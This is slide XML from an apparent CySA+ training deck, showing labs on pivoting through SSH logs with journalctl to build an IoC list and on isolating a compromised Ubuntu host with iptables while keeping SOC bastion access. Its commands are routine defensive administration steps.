          <a:xfrm>
            <a:off x="7315200" y="3726180"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726180"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ journalctl _SYSTEMD_UNIT=ssh.service --since "2026-05-13 08:00" --until </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4824984"/>
            <a:ext cx="10634472" cy="139293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4824984"/>
            <a:ext cx="91440" cy="139293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005840" y="5292852"/>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05840" y="5292852"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4824984"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: IoC list extracted from the analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Feed this list into the Threat Intel pipeline (Lab 10) and the containment script (Lab 24).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5247132"/>
            <a:ext cx="3977639" cy="5486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52360" y="5247132"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; iocs.txt &lt;&lt;'EOF'</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746</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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23 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Pivot across auth, web, and netflow logs from a single starting IoC.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Build an incident timeline that maps cleanly to the kill chain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use journalctl to do the same on a live systemd host.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Produce a structured IoC list ready for containment and reporting.</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747</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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24 — Containment with Host Isolation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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will isolate a compromised host with iptables / nftables, apply compensating controls, and verify that the box can still reach the SOC analyst workstation but nothing else. This maps to CySA+ 3.2 (Containment, eradication, and recovery — Scope, Impact, Isolation, Remediation, Re-imaging, Compensating…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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748</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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24 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y iptables nftables iproute2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Snapshot current connectivity (scope of impact)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Record what is talking to what — this is the "Scope" and "Impact" assessment.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ip addr | grep -A1 'state UP'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Define the SOC bastion (your management channel)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Containment that locks you out is useless.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ SOC_IP=10.10.0.10      # your analyst workstation / EDR console</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Apply a "network isolation" policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The host is now reachable only from the SOC bastion on port 22 — every other connection (including the attacker's C2) is dead.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ iptables -P INPUT DROP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Save the rules so isolation survives reboot</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Without this, a reboot during eradication accidentally unisolates the host.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt install -y iptables-persistent</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749</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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24 — Hands-On Steps (cont'd)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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Kill active malicious connections (eradication start)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Killing connections before isolation lets them re-establish; after isolation they cannot.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t># Find the suspect process (Lab 5)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Apply compensating controls (CySA+ "Compensating controls")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>While the team eradicates, mitigate continued risk on neighbouring systems:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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240" y="3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Re-imaging vs cleanup decision</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Re-imaging is the only deterministic way to remove unknown unknowns.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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005840" y="468447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05840" y="4684470"/>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28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Verify isolation worked</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Both should fail.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t># From the host (Killercoda terminal):</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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5840" y="5597041"/>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5840" y="5597041"/>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5</a:t>
            </a:r>
